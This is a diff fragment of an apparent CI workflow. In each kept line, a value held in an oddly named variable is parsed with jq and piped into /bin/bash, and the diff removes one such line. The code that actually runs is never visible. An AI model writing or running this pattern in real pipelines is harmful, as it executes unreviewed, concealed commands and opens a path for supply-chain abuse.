@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$pa21" | jq -r .f4637 | /bin/bash
           printf '%s' "$rtz62272" | jq -r .t6894 | /bin/bash
           printf '%s' "$wk207" | jq -r .fb469 | /bin/bash
-          echo $e0930 | jq -r .u5266 | /bin/bash
           echo $nsa8 | jq -r .tqr7 | /bin/bash
 
       - name: Store results
